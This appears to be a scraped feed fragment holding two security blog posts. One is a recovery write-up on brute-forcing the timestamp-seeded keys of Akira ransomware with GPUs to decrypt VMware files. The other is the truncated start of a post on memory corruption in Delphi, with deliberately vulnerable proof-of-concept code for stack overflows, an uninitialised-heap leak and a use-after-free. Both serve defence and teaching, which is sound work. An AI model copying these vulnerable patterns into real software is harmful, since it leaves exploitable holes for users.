0x455f40 in the binary)</p><div><pre title=\"\">void generate_random(char *buffer, int size)\n{\n    uint64_t t = get_current_time_nanosecond();\n    char seed[32];\n //in the real code, it uses C++ code to convert int to string\n    snprintf(seed, sizeof(seed), \"%lld\", t);\n    struct yarrow256_ctx ctx;\n    yarrow256_init(&amp;ctx, 0, NULL);\n    yarrow256_seed(&amp;ctx, strlen(seed), seed);\n    yarrow256_random(&amp;ctx, size, buffer);   \n}\n\n</pre></div><p>The random generator is implemented in . Here is the relevant code, with unnecessary parts removed. As noted in the comments:</p><blockquote><p>The number of iterations when reseeding, P_t in the yarrow paper. Should be chosen so that reseeding takes on the order of 0.1-1 seconds.</p></blockquote><div><pre title=\"\">void\nyarrow256_seed(struct yarrow256_ctx *ctx,\n\t       size_t length,\n\t       const uint8_t *seed_file)\n{\n  sha256_update(&amp;ctx-&gt;pools[YARROW_FAST], length, seed_file);\n  yarrow256_fast_reseed(ctx);\n}\n\nvoid\nyarrow256_fast_reseed(struct yarrow256_ctx *ctx)\n{\n  uint8_t digest[SHA256_DIGEST_SIZE];\n  unsigned i;   \n  sha256_digest(&amp;ctx-&gt;pools[YARROW_FAST], sizeof(digest), digest);\n  /* Iterate */\n  yarrow_iterate(digest);\n  aes256_set_encrypt_key(&amp;ctx-&gt;key, digest);\n  /* Derive new counter value */\n  memset(ctx-&gt;counter, 0, sizeof(ctx-&gt;counter));\n  aes256_encrypt(&amp;ctx-&gt;key, sizeof(ctx-&gt;counter), ctx-&gt;counter, ctx-&gt;counter); \n}\n\n/* The number of iterations when reseeding, P_t in the yarrow paper.\n * Should be chosen so that reseeding takes on the order of 0.1-1\n * seconds. */\n#define YARROW_RESEED_ITERATIONS 1500\n\n\nstatic void\nyarrow_iterate(uint8_t *digest)\n{\n  uint8_t v0[SHA256_DIGEST_SIZE];\n  unsigned i;\n  \n  memcpy(v0, digest, SHA256_DIGEST_SIZE);\n  \n  /* When hashed inside the loop, i should run from 1 to\n   * YARROW_RESEED_ITERATIONS */\n  for (i = 0; ++i &lt; YARROW_RESEED_ITERATIONS; )\n    {\n      uint8_t count[4];\n      struct sha256_ctx hash;\n  \n      sha256_init(&amp;hash);\n\n      /* Hash v_i | v_0 | i */\n      WRITE_UINT32(count, i);\n      sha256_update(&amp;hash, SHA256_DIGEST_SIZE, digest);\n      sha256_update(&amp;hash, sizeof(v0), v0);\n      sha256_update(&amp;hash, sizeof(count), count);\n\n      sha256_digest(&amp;hash, SHA256_DIGEST_SIZE, digest);\n    }\n}\n</pre></div><p>The ransomware calls the random generator four times:</p><div><pre title=\"\">generate_random(chacha8_key 32);\ngenerate_random(chacha8_nonce, 16);\ngenerate_random(kcipher2_key, 16);\ngenerate_random(kcipher2_key, 16);\n</pre></div><p>Each  call uses the current nanosecond timestamp as a seed. Therefore, there are  that need to be identified. The ransomware generates <strong>different keys for each file</strong>.</p><p>These keys are then saved at the <strong>end of the file as a trailer</strong>, encrypted with  and padded using .</p><p>The files are divided into , and a percentage of each block is encrypted. This percentage is defined by the ransomware’s  parameter. For each block:</p><ul><li>The first  are encrypted using .</li><li>The remaining bytes are encrypted using ..</li></ul><p>The following picture shows how a file is split. Note that, for very small files, knowing the Chacha8 key and IV isn’t necessary..</p><p>After studying various VMware filetypes (I will go deeper into this later), I am convinced that the most important files (flat VMDK and sesparse files) has a fixed header, and I can use that to attack the  encryption.</p><p>At this point, I didn’t analyze deeper. But I am sure that I can reverse engineer the rest of the algorithms later, specifically:</p><ul><li>How to split the file into blocks</li><li>How is the encryption performed across blocks, does it continue the stream?</li></ul><p>These details will be important later. However, for now, if we can’t successfully brute-force the timestamps, none of the other steps will matter.</p><p>The approach is as follows:</p><ol><li> ( and ).</li><li>Convert these timestamps into seeds and generate random bytes.</li><li>Use these bytes as the .</li><li>Encrypt known plaintext and compare the result with the known ciphertext from the encrypted file.</li></ol><ul><li>: Determine if brute-forcing is fast enough to be practical.</li><li>: Known plaintext is required for brute-forcing. </li><li><strong>Estimate the seed initialization time</strong>: We need to know when the encryption seed was initialized, at least with . This knowledge can reduce the brute-force scope to about .</li></ul><p>The simplest (but inefficient) way is to try all possible timestamp pairs where . The number of possible pairs is calculated as: N×(N−1)/2</p><p>With , that results in  possible pairs.</p><p>We need to optimize this. First we need to convert all the nanoseconds in a one-to random values:</p><ul><li>On my , I estimated a processing speed of 100,000 timestamp to random bytes calculations per second (utilizing all cores).</li><li>This means it would take about  (under ) to convert all timestamps to seed values.</li><li>Once converted, these values can be saved for reuse.</li><li>Later, I optimized the process using a , reducing the conversion time from <strong>3 hours to under 6 minutes</strong>.</li></ul><p>If we have a completely deterministic machine, without any interruption, we can run the malware, measure it, know the exact time between T3 and T4. But unfortunately we don’t have this:</p><ul><li>The malware uses multiple threads,</li><li>It runs on a machine that is not idle, the distance between T3 and T4 varies based on the scheduler and how busy the system at that time. </li><li>The code also calls a lot of C++ libraries, which allocates and deallocates objects and makes the execution time more unpredictable.</li></ul><ul><li>we need to enumerate t3 (1 billion values for each second)</li><li>we dont start at t3 + 1, but at t3 + start offset, since we know that seeding the value takes time (at least a million nanosecond on my machine), this is the ““</li><li>we assume that it will only take a few million nanosecond to until the next code is executed (remember: there can be interruptions because of the CPU scheduler, and there are several millions instructions executed). This is the “” value</li></ul><p>What we can do is to try to run the exact same code as the malware, collect timing data, and try to find a range that statistically makes sense. Using the same <a href=\"https://tinyhack.com/2024/11/18/patching-so-files-of-an-installed-android-app/\">technique that I use on my previous post</a>, instead of recreating the algorithm and running it, I just modified the malware and tested on several local machines that I have. The runtime varies quite a lot between machines.</p><p>My friend <a href=\"https://github.com/huhnscheibe\">Deny</a> went to the datacenter and did the test on the real hardware that was infected. The result is: the time range varies, and sometimes quite a lot. The normal range of the offset is around 2-4 million nanoseconds (so the offset range is 2 million), but the value varies from 1.5 – 5 million (total offset range is  4.5 million). </p><p>We still need to enumerate 4.5 quadrillion pairs, but this appears to be doable. If we have a system capable of running 50 million encryptions per second, the process would take a few hundred days. However, with 16 such systems, we could complete it in a few months on a CPU. By renting additional machines, we could speed up the process even further. Later, I optimized this using a GPU, achieving a significant speed improvement.</p><p>I wasn’t sure about how fast we can do Kicpher2, but a quick comparison with chacha, and some quick benchmarking shows that using CPU ony, I should be able to do at least millions of Kichper operations per second on my machine.</p><p>As explained before,  if  and  are correct, we will be able to decrypt the  of the file, and it will decrypt to a known plaintext.</p><p>Next lets check the feasibility of obtaining plaintext from different VMware files</p><p>For each file, we need a plaintext sample: the first 8 bytes of the file for KCipher2 (offset 0) and another 8 bytes starting from offset 65,535 (only for large files). Since each block of KCipher2 is 8 bytes, we should use an 8-byte plaintext. It is possible to use fewer bytes (by using bit masking), but this could increase the risk of false positives.</p><p>This is a raw disk file. If you’re lucky, this might be the only file you need to recover. However, if snapshots were made (as in this client’s case), the new data would be written to sesparse files.</p><p>To obtain the first 8 bytes of the flat VMDK, you’ll need to install the same OS that was used on the original VM. There are several variations of bootloaders used by different OS versions.</p><p>To determine which OS was used, check the corresponding VMX file. It should contain partially readable plaintext, allowing you to inspect the configuration for “guestOS”. You might find something like: guestOS=”ubuntu”. However, ideally, you already have documentation regarding which OS was used for each VM, so you don’t have to rely on this method.</p><p>For the bytes at position 65,535 (plaintext for Chacha8), it is almost always guaranteed to be zero, since the partition typically starts at a later sector.</p><p>If you create snapshots for your VM, there will be a SESPARSE file for each snapshots. We can see the file format from the QEMU source code.</p><p>The file header is , and at position 65,535, it should be 0x0 (at least, that’s what I observed in my analysis).</p><p>Other files are not critical for restoring a working VM, but for initial testing, understanding the time distribution can be helpful. If there are many small files with the same timestamp, it’s useful to know if they cluster within a specific timestamp range.</p><p>Here are some common file signatures to identify plaintexts:</p><ul><li>NVRAM files start with: 4d 52 56 4e 01 00 00 00</li><li>VMDK files (disk descriptor) start with the string: </li><li>.VMX files start with: </li><li>VMware log files have lines starting with the format: Since these files are partially readable, we can often guess the initial timestamp based on the beginning of the file (e.g., the  part of the log).</li></ul><p>By identifying plaintexts in these files, the next step is to narrow down the timestamp for accurate brute-forcing.</p><p>Now that we know brute-forcing is feasible and we have both plaintext and ciphertext, the next step is to determine when the encryption occurred for each file (since each file will have different keys).</p><p>The command used to run the malware is recorded in the shell.log file (including the setting for n, which defines how much of the file should be encrypted).</p><p>Some ESXi hosts provide millisecond resolution in their logs, while others only offer second-level precision. This log gives us the initial timestamp for when the malware started.</p><p>For example, if the log shows that the malware started at 10:00:01.500, we can safely ignore the first 500 million nanoseconds when brute-forcing, which helps narrow down the search range.</p><h4>Filesystem timestamp and modification time</h4><p>Unfortunately, ESXi file systems do not support nanosecond precision.</p><p>Another challenge is that the file modification time is recorded only when the file is closed. This means the recorded timestamp might not exactly reflect the moment when the encryption process started but rather when it ended.</p><p>For small files, encryption typically takes only a few milliseconds, so the timestamp will most likely reflect the exact second when the file was encrypted. The next step is to determine the encryption time for larger files, where the process takes longer and the timestamps may be less precise.</p><h4>Multithreaded  Encryption</h4><p>The malware uses multithreading, where each file is processed in a new thread, with a pool of workers limited by the number of CPU cores. This has both advantages and disadvantages.</p><p>If the malware targets a single directory and the number of files is less than the number of CPU cores, the process is straightforward—each file will have a timestamp that is very close to the others. On an ESXi machine, it’s common to have CPUs with a large number of cores (in this case, the server has 64 cores).</p><p>When checking for timestamps using:</p><div><pre title=\"\">find /vmfs/volumes -exec stat {} \\;\n</pre></div><p>we should be able to identify small files that were encrypted first. During brute-forcing, we can then check multiple files simultaneously for that specific moment in time.</p><p>Files processed first will have similar timestamps, but things become more complex for files processed later. For larger files, encryption can take seconds to minutes, and the modification time will reflect when the file was closed, which is significantly later than when the encryption key was actually generated.</p><p>The malware uses  for traversing directories and files. The iterator in  follows the order returned by , which is the same order observed when using commands like  or .</p><p>Let’s consider an example where we have 4 CPU cores and 8 files. If the files are tiny (less than 1 KB, such as VMDK descriptor files), their processing is almost instantaneous (within milliseconds). Here’s how the processing might look:</p><ul><li> each find and process  (, , ), while  finds a  (). All four files are processed . </li><li>Once  complete, they begin processing the  (, , ). However, these files are  and require . </li><li>While the other three threads are still working,   finishes processing the large  and starts working on the  (). As a result, the  of  will align with the  of .</li></ul><p>Now, imagine having hundreds of files—it becomes difficult to determine the exact processing order. However, one consistent observation is that the encryption start time for a file is likely to be the same or very close to the modification time of another file.</p><p>This is because, once a thread finishes processing and closes a file (thereby recording its modification time), it will immediately start processing the next available file. This creates a sequence where the encryption start time of one file is closely linked to the modification time of the previous file.</p><p>So given few hundred files and plenty of CPU cores, we may only have a list of a few seconds where the malware will start to generate the random keys. </p><p>So now we have the final part of the puzzle: we know  the encryption was performed.</p><p>While reviewing the client’s logs, I noticed some entries mentioning the use of NFS. However, after clarification, it was confirmed that NFS was used only for backups and was not affected. All relevant files were stored on local disks on the server.</p><p>If a network filesystem had been used, it would have complicated the process. If the network time between systems wasn’t perfectly synchronized, the timestamps might have been inaccurate or unreliable, further complicating the brute-force process.</p><p>The plan seemed solid, so the next step was to implement the code. I needed to confirm whether the encryption process worked exactly like the malware.</p><p>To test this, I patched the malware code to make the gettime function return a constant value of 0, ensuring predictable and consistent results during testing.</p><p>I focused on KCipher2 because not all files use the Chacha8 key, particularly small files. Although KCipher2 is a standard encryption algorithm, it’s not widely known, and I couldn’t find an optimized implementation for it.</p><p>During experimentation, I noticed that my results didn’t match the standard KCipher2 implementations available online. It turned out that the malware included a slight modification in the initialization vector and the encryption process, specifically involving endian swapping.</p><p>I’m not an expert in CUDA programming. About 10 years ago, I briefly experimented with it but couldn’t find a practical use case for the company I worked for at the time.</p><p>To accelerate development, I asked ChatGPT (o1) to port the code to CUDA. The code compiled successfully but produced incorrect results. It turned out that ChatGPT had slightly modified the numbers in the constant tables. After manually correcting these values, the code began to work.</p><p>Although the implementation ran, I suspected it was suboptimal, but I wasn’t able to get further optimization suggestions from ChatGPT (o1). At that point, I had two options: spend more time optimizing the code or proceed with the predicted offset range and refine the code along the way. I chose to start testing immediately and optimize as needed. Unfortunately, this approach turned out to be a waste of money, as it didn’t yield any successful results.</p><p>At the start of the project, I only had two RTX 3060 GPUs. One was dedicated to my Windows machine, so I could only use one GPU on my Mini PC (connected externally via Oculink). To improve performance, I decided to purchase an RTX 3090. The price in Thailand was still reasonable compared to the 4090 or higher models.</p><p>I tested the implementation by reading the key and IV from memory, encrypting zero blocks, and writing the results back to memory. The performance was disappointing, achieving only around 60 million encryptions per second. At this rate, the entire process would take about 10 years, clearly too slow for practical recovery.</p><p>I performed some manual optimizations by removing unnecessary code to improve performance:</p><ul><li>Only the first block is needed for brute force, so there was no need to handle additional blocks.</li><li>The code was simplified to only encrypt blocks of zeroes, reducing unnecessary processing.</li><li>Since only the first 8 bytes of the result were required, the rest of the output was ignored to minimize computation.</li></ul><p>After researching CUDA optimizations for AES, I discovered that using shared memory significantly improves performance, contrary to what ChatGPT suggested. Surprisingly, the extra steps involved in copying constant memory data to shared memory were negligible in terms of overhead but resulted in the code running several times faster.</p><p>Initially, I performed encryption on the GPU and matching on the host (CPU). However, this approach was slow, even when executed in parallel:</p><ul><li>generate encryption on GPU</li><li>Perform matching in a new thread and submit the next batch of work to the GPU.</li></ul><p>I found it much faster to avoid writing to memory altogether. Instead, the matching process is handled directly on the GPU, and no data is written to memory unless a match is found. This approach significantly reduced processing time and improved efficiency.</p><p>For each t3 and t4 combination, a match can occur for any file that shares the same second-level timestamp (but with different nanoseconds).</p><p>To improve efficiency, we can attempt to match multiple files simultaneously. However, if there are too many files to match, the process can slow down significantly. Currently, the number of files processed in parallel is hardcoded to 32 to maintain a balance between performance and efficiency.</p><p>I considered and implemented two ways to do the loop. For every t3 value, we could start a GPU kernel to check all offset ranges. However, this method is inefficient, as it would require launching the kernel a billion times, resulting in significant overhead..</p><p>Alternatively, we can launch a GPU kernel for each offset. Each kernel would then perform the necessary checks. This approach is much faster because it reduces the number of submissions to just the “offset range”, which is around 2 to 4.5 million jobs.</p><p>Initially, my approach was to submit a task to the GPU, wait for the result using , and then submit the next batch of work. However, this method proved to be slow.</p><ul><li>Submit work to the GPU, and if a match is found, simply mark it using a found flag.</li><li>Only call  to check results every 100 steps. If a match is found, the flag is reset to zero before proceeding.</li></ul><p>While this method significantly improved performance, there’s a slight possibility that if two offsets are very close (less than 100 steps apart), the code might miss one of them. Although this issue never occurred during my tests, I added an optional mode of loop. In this mode, the program reads a list of  offsets and ensures that nearby offsets are also checked manually to avoid missing any potential matches.</p><p>I believe that GPU experts could still find ways to further optimize my code. Currently, I’m achieving around 1.5 billion encryptions per second for KCipher2 on my RTX 3090.</p><ul><li>For testing 1 billion values with a single offset, it takes about 0.7 seconds, including the time to check for matches (with a maximum of 32 matches per batch).</li><li>Testing 2 million offsets would require approximately 16 days on a single GPU, or just 1 day using 16 GPUs.</li></ul><p>I also conducted tests using <a href=\"https://runpod.io?ref=uoolmxxd\">Runpod</a>, and the RTX 4090 turned out to be the ideal option. Although it’s about 60% more expensive than the 3090, it’s also 2.3 times faster.</p><ul><li>With a 4090, the same process would take around 7 days on a single GPU.</li><li>Using 16 GPUs, the process could be completed in just over 10 hours.</li></ul><p>From a cost perspective, the RTX 4090 is an excellent choice for this task due to several factors:</p><ul><li>Large memory is not required.</li><li>Floating-point operations are not needed.</li><li>The RTX 4090 offers a high number of CUDA cores, enhancing processing speed.</li><li>The rental price for an RTX 4090 is relatively low compared to other high-end GPUs.</li></ul><p>If the 4090 is unavailable, the 3090 is also a good alternative considering its price-to-performance ratio.</p><p>Initially, my client considered using Google Cloud Platform (GCP) machines and seeking a discount for a month-long rental. However, this option proved to be extremely expensive (costing tens of thousands of USD).</p><p>After some research, I found more cost-effective alternatives: Runpod and Vast.ai.</p><p>To brute force 1 second (1 billion nanosecond), with offset range of 2 million, it  will take 7 days. The cost for a RTX 4090 (at the time of this writing) is 0.69 USD/hour. It will cost around 116 USD to brute force a single second.  Renting 16 GPUs will have the work finished in around 10 hours, same cost, but faster.</p><p>Brute forcing with the range of 4.5 million (which is the range that we need) costs 261 USD. Depending on the number of encrypted files, you might need to brute force 10 or more seconds. If you have a lot of files to recover, weekly or monthly rent will be cheaper.</p><p>Note: These costs assume everything is executed perfectly. Any mistakes or the need to repeat processes can significantly increase costs.In total, including all my experiments and tests, I spent around $1,200.</p><p>Unlike runpod, when using vast.ai, you are renting a machine from some random person brokered by vast.ai. When doing the bruteforce, no sensitive data is sent, so privacy should not be a concern.</p><p>Using vast AI, the bruteforce cost  can be reduced to half, but this depends on your luck in obtaining the machine. The first few machines that I tested didn’t work (network timeout after around 10 minutes of waiting). I also had problem with pulling docker images from docker.io (I had to select another template from another docker repository).</p><p>Now that I found the value of t3 and t4, I can try to find the value for t1 and t2. The value of t1 must be less than t3, and the time offset is less than 10 million nanoseconds. This can be found quickly in minutes using a single GPU.</p><p>Here is the algorithm used to split the file into parts:</p><ul><li>enc_block_size: for every parts/blocks, this is how many bytes to encrypt. The first 0xFFFFF will be encrypted using KCipher2, and the rest using Chacha8</li><li>part_size: the size of the block</li><li>encrypted_parts: how many blocks to encrypt</li></ul><div><pre title=\"\">void compute_blocks(uint64_t filesize, \n    uint8_t percent,\n    uint64_t *enc_block_size,\n    uint64_t *part_size,\n    uint64_t *encrypted_parts)\n{\n    int parts = 3;\n    if ( percent &gt; 49u )\n        parts = 5;\n    uint64_t enc_size = filesize * (uint64_t)percent / 100;\n    *enc_block_size = enc_size / parts;\n    *encrypted_parts = parts - 1;\n    *part_size = (filesize - *enc_block_size * (*encrypted_parts)) / parts;  \n}\n</pre></div><p>The malware uses the 8 rounds variant of Chacha called chacha8, not Chacha20 as many sites reported.</p><ul><li>For kcipher2, we will encrypt the first 65535 bytes (yes, not 65536). It means that one byte will remain from the first block, and this needs to be used for the next block</li><li>For cacha20, we just throw away the rest of the encryption stream block when starting a new block</li></ul><p>To recover your files without paying, it is not as straightforward as running a generic decryptor. You will need to:</p><ul><li>obtain timestamps of your files</li><li>obtain ciphertext and plaintext for your files</li></ul><p>To be honest, I originally wrote this code for one-time use, specifically for this particular client. The shared code is filled with experimental logic, quick hacks, and lacks proper testing.</p><p>I don’t have the motivation to clean it up further, apart from removing some client-specific test cases and comments. It’s functional for the intended purpose.</p><p>The software I provided includes only the main brute-force and decryption components, intended to be used once you have the necessary timestamps.</p><p>I don’t have a dedicated system to manage multiple GPUs. Instead, I rely on basic shell scripting and a custom script that sends a Telegram message when a match is found. The code is “good enough for me” and simply “works for me.”</p><p>In essence, you’ll need a capable system administrator who understands the process and knows how to manage and troubleshoot the system effectively.</p><p>See README.md in the repository, it also has a sample config file to test that it works. Sample encrypted files and configuration files are also provided.</p><p>I hope you haven’t touched the files, because all hope of recovery will be gone if the timestamps are unknown. Use  to get the modification timestamp. Use <code>find /vmfs/volumes -exec stat {} \\; &gt; /tmp/stats.txt</code> to get the timestamp of everything.</p><p>The file  can help to figure out the minimum timestamp to use.</p><p>Obtain the ciphertext, as explained above:</p><ul><li>For flat-vmdk, you need to extract this from the exact OS that you use (including the exact instalation method, e.g: using BIOS/UEFI)</li><li>For sesparse file, use the header </li><li>For other files, see what I wrote above</li></ul><p>You can always just use an offset range of 1.5-5 million, but this may not be the correct range if your hardware is too fast or too slow. You can measure this by checking out the  folder and  folder on my github repository.</p><p>The first one only measures time ranges by calling the function directly. The second one is used to encrypt a directory, but it is patched so that it will write down the exact time when the timestamp is used as the seed to .</p><p>Create config files based on the ciphertext/plaintext and timestamp. You can create/split this manually, or use a script to generate it. My code doesn’t do any error checking, make sure the timestamp is in nanosecond format, make sure all plaintext and ciphertext values are correct.</p><p>If you want a very quick and easy setup, use runpod or other service. If you want to be cheap, use vast.ai, or run it on your own hardware (~ 1K USD for one RTX 3090, which you can resell later).</p><p>The first brute force is to find t3 and t4 for Kcipher. </p><p><code>./akira-bruteforce run2 config.json</code></p><p>Append GPU index if you have multiple GPUs</p><p><code>./akira-bruteforce run2 config.json 1</code></p><p>I suggest running it inside tmux, so you will be fine in the event of network disconnect.</p><p>If we are lucky, output.txt will be generated for each t3/t4 found.</p><p>This is not necessary for small files, but it is neede for big files. For each offset found, generate a config with the t3 found in the previous step. On my target machine, the distance between t1 and t3 is less than 10 million, and the t1 to t2 is  around 1.5 – 5 million. The brute force should only take around 10 minutes.</p><p>Note that the decryptor has the percentage hardcoded to 15 percent, so please change this before running the decryptor in case the attacker uses different value.</p><p>Once we have obtained the t1, t2, t3, and t4, run the decryptor:</p><p><code>./decrypt filename.vmdk &lt;t1&gt; &lt;t2&gt; &lt;t3&gt; &lt;t4&gt;</code></p><p>The decryption process is not optimized, so it will take a while to decrypt.</p><p>./anti-akira run config.json &lt;gpuindex&gt;</p><p>As explained above: this may take days, so please make sure:</p><ul><li>all the config files are good</li><li>You are using the correct GPU index</li><li>make sure everything is running</li><li>check with nvidia-smi (with runpod, we can also view the GPU status using the web)</li><li>make a notification system to alert you if output.txt is created/updated</li></ul><p>Probably 99.9% of the time when you get a ransomware, it won’t be recoverable without the key. But if you are lucky, sometimes it is possible to find a solution. It took me much longer than I anticipated to solve this, I thought that it would take a week, but it took me almost three weeks until we recover an entire set of VM files.</p><p>I also would like to add that I found a reddit thread about <a href=\"https://www.reddit.com/r/sysadmin/comments/1crmt10/we_are_the_team_behind_the_decryption_of_the/\">akira ransomware</a> , I wasn’t sure that the ransomware strain that I have is the same as theirs, and that is the reason why I just continue my own research and to open source it. I hope that my experience and code will be useful for someone else. </p><p>Everytime I wrote something about ransomware (in my Indonesian blog), many people will ask for ransomware help. Many people can’t even find the ransomware executable (just the encrypted file, which is not useful). Just checking if the ransomware is recoverable or not may take several hours with a lot of efforts (e.g: if the malware is obfuscated/protected). So please don’t ask me to do that for free. </p>","contentLength":31291,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jasfsv/decrypting_encrypted_files_from_akira_ransomware/"},{"title":"Memory Corruption in Delphi","url":"https://blog.includesecurity.com/2025/03/memory-corruption-in-delphi/","date":1741901379,"author":"/u/907jessejones","guid":800,"unread":true,"content":"<p><a href=\"https://includesecurity.com\">Our team at Include Security</a> is often asked to examine applications coded in languages that are usually considered “unsafe”, such as C and C++, due to their lack of memory safety functionality. Critical aspects of reviewing such code include identifying where bounds-checking, input validation, and pointer handling/dereferencing are happening and verifying they’re not exploitable. These types of vulnerabilities are often disregarded by developers using memory safe languages.</p><p>In 2023 the NSA published a paper on <a href=\"https://media.defense.gov/2023/Apr/27/2003210083/-1/-1/0/CSI_SOFTWARE_MEMORY_SAFETY_V1.1.PDF\">Software Memory Safety</a> that included Delphi/Object Pascal in a list of “memory safe” languages. The paper caveats the statement by saying:</p><blockquote><p>Most memory safe languages recognize that software sometimes needs to perform an unsafe memory management function to accomplish certain tasks. As a result, classes or functions are available that are recognized as non-memory safe and allow the programmer to perform a potentially unsafe memory management task.</p></blockquote><p>With that in mind, our team wanted to demonstrate how memory management could go wrong in Delphi despite being included on the aforementioned list and provide readers with a few tips on how to avoid introducing memory-related vulnerabilities in their Delphi code.</p><p>In this blog post, we take the first steps of investigating memory corruption in Delphi by constructing several simple proof-of-concept code examples that demonstrate memory corruption vulnerability patterns.</p><p>There’s also a free and open source IDE named <a href=\"https://www.lazarus-ide.org/\">Lazarus</a>, which uses the <a href=\"https://www.freepascal.org/\">Free Pascal</a> compiler, and aims to be Delphi compatible.</p><h3>Memory Corruption and Memory Safety</h3><p>We’d like to take a look at how memory corruption vulnerabilities could be introduced in languages other than C/C++, where such vulnerabilities are often discussed. This blog post takes the first steps in investigating what memory corruption vulnerabilities might look like in Delphi code by writing several proof-of-concept demonstrations of the types of memory corruption that often lead to vulnerabilities.</p><p>Delphi has been claimed to be a memory-safe language <a href=\"https://blogs.embarcadero.com/is-delphi-a-memory-safe-language/\">in some contexts</a> but we consider it similar to C++ in regards to memory safety. Object Pascal and Delphi <a href=\"https://docwiki.embarcadero.com/RADStudio/Athens/en/Pointers_and_Pointer_Types_(Delphi)\">support arbitrary untyped pointers</a> and <a href=\"https://docwiki.embarcadero.com/Libraries/Athens/en/System.Ptr\">unsafe pointer arithmetic</a>, which can intentionally or not lead to memory corruption. But rather than simply show that dereferencing an arbitrary pointer value could cause a crash, we wanted to demonstrate a couple of memory corruption patterns that commonly lead to vulnerabilities in software. The following examples were compiled in the RAD Studio Delphi IDE with all of the default compiler options.</p><h3>Stack-Based Buffer Overflow</h3><p>Let’s start by trying to write a simple stack-based buffer overflow in Delphi. Note that in these following examples, the code was compiled in Win32 mode, which was the default, though the general concepts apply to other platforms as well. Here’s our first attempt at a stack-based buffer overflow:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">procedure Overflow1;\nvar\n  ar: Array[0..9] of Byte;          // Fixed-length array on the stack\n  i: Integer;\nbegin\n  for i := 0 to 999 do\n  begin\n    ar[i] := $41;                   // Try to overflow the array\n  end;\nend;                                // If overflow happens, returns to $41414141\n</pre><p>We define an array of 10 bytes, and then try to write 1000 values to the array. When we compile and run this code, it raises an exception but doesn’t crash:</p><p>Why didn’t it crash? Since the array  is defined with a static length, the compiler can insert code that does bounds-checking at runtime whenever the array is indexed. Let’s take a look at the compiled procedure (disassembled in Ghidra):</p><p>The code tests that the index is less than or equal to 9 and if it’s not, it calls a function that raises the exception (CMP EAX, 0x9, JBE, CALL).</p><p>But wait, this was the application compiled in debug mode. What happens if we compile the application in release mode?</p><p>Ah! In release mode, the compiler didn’t include the array bounds check, and the code overwrote the return address on the stack. Shown above is the Delphi debugger after returning to . Here’s the release build code, again disassembled in Ghidra:</p><p>No bounds check in sight. Why not? The “<a href=\"https://docwiki.embarcadero.com/RADStudio/Athens/en/Range_checking\">Range checking</a>” (which is what caught the overflow in debug mode) and “<a href=\"https://docwiki.embarcadero.com/RADStudio/Athens/en/Overflow_checking_(Delphi)\">Overflow checking</a>” (which checks for integer overflows) compiler settings are disabled by default in release mode:</p><p>So here is a lesson: consider turning on all the “Runtime errors” flags in release mode when hardening a Delphi build. Of course, the added checks are likely disabled by default to avoid performance impacts.</p><p>But how easy is it to overflow a buffer with Range checking enabled? Well, the official Delphi documentation warns about memory corruption in a few of its system library routines:</p><p>Note that these are just the system library routines that clearly warn about memory corruption in their documentation; it’s not a comprehensive list of dangerous routines in Delphi.</p><p>Here’s an example that uses to cause a stack buffer overflow:</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">procedure Overflow2;\nvar\n  ar1: Array[0..9] of Byte;        // Smaller array on the stack\n  ar2: Array[0..999] of Byte;      // Larger array on the stack\n  i: Integer;\nbegin\n  for i := 0 to 999 do\n  begin\n    ar2[i] := $41;                 // Fill ar2 with $41\n  end;\n  Move(ar2, ar1, SizeOf(ar2));     // Oops should have been SizeOf(ar1)\nend;                               // Returns to $41414141\n</pre><p>This time, we create two stack buffers, fill the bigger one with , then use to copy the bigger array into the smaller array. When we run this code, even the debug build with Range checking enabled overflows the stack buffer and returns to :</p><h3>The Heap and Use After Free</h3><p>Let’s take a look at a couple examples of how heap-based vulnerabilities might be introduced. In these examples it was easy to cause the default heap implementation to allocate the same memory after a previous allocation had been freed by specifying allocations of the same size.</p><p>In this first example, we allocate a string on the heap, assign a value to it, free the string, then allocate another string which shares the same memory as the previous string. This demonstrates how reading uninitialized memory might lead to an information disclosure vulnerability. In this case, was used to set the length of a string without initializing memory.</p><p>In this example, first calls , which dynamically constructs a string, causing memory to for it to be allocated on the heap. The memory is freed as the string goes out of scope. Next, calls . calls , which allocates memory for a string without initializing the heap memory, then reads the contents of the string revealing the string constructed in .</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">procedure Heap1a;\nvar\n  s: String;                       // Unicode string variable on the stack, contents on the heap\nbegin\n  s := 'Super Secret';             // Assign a value to the string\n  s := s + ' String!';             // Appending to the string re-allocates heap memory\nend;                               // Memory for s is freed as it goes out of scope\n\nprocedure Heap1b;\nvar\n  s: String;                       // Unicode string variable on the stack, contents on the heap\nbegin\n  SetLength(s, 20);                // Trigger re-allocation, does not initialize memory\n  ShowMessage(s);                  // Shows 'Super Secret String!'\nend;\n\nprocedure Heap1c;\nbegin\n  Heap1a;\n  Heap1b;\nend;\n</pre><p>When the above code is run, the call produces the “Super Secret String!” in a dialog:</p><p>In this second heap example, memory is allocated for an object on the heap, then freed, then another object is allocated using the same heap memory. This is similar to how the same memory region was re-used by the strings in the previous example. In this case, the freed object is written to, modifying the second object. This represents a use-after-free vulnerability, where an attacker might be able to modify an object, either to obtain code execution or otherwise modify control flow.</p><p>and are two classes that contain a similar amount of data. In the procedure , , an instance of is created then immediately freed. Next, , an instance of is created and read. Then, the freed is written to. Finally, is read again showing that it was modified by the access to .</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">type\n[…]\n\n  TMyFirstClass = class(TObject)\n    public\n      ar: Array[0..7] of Byte;\n  end;\n\n  TMySecondClass = class(TObject)\n    public\n      n1: Integer;\n      n2: Integer;\n  end;\n\n[…]\nimplementation\n[...]\n\nprocedure Heap2;\nvar\n  obj1: TMyFirstClass;\n  obj2: TMySecondClass;\nbegin\n  obj1 := TMyFirstClass.Create;                 // Create obj1\n  obj1.Free;                                    // Free obj1\n  obj2 := TMySecondClass.Create;                // 